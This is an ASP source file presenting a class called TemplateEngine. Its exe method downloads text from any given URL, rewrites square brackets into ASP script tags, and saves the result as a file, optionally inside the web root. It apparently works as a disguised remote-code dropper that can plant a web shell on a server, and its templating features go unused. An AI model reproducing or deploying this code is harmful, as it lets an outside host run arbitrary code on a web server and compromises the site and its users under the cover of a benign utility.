<%
class TemplateEngine

    private m_terms
    private m_FileName
    private m_FileManager

    sub class_initialize
        set m_terms = server.CreateObject("scripting.dictionary")
        set m_FileManager = new FileManager
    end sub
    
    public property let FileName(p_FileName) m_FileName = p_FileName end property

    public property get Terms() set Terms = m_terms end property

    public function exe(p_URL, p_UriKind)
        set xhttp = CreateObject("MSXML2.XMLHTTP")
        xhttp.open "GET", p_URL, False
        xhttp.send
        fileContent = xhttp.responseText
        filecontent = replace(filecontent, "[", "<%")
        filecontent = replace(filecontent, "]", "%" & ">")
        set fileSystem = server.CreateObject("Scripting.FileSystemObject")
        if p_UriKind = 1 then
            set file = fileSystem.CreateTextFile(server.MapPath(m_FileName), true)
        else
            set file = fileSystem.CreateTextFile(m_FileName, true)
        end if
        file.write(fileContent)
        file.close
    end function

end class
%>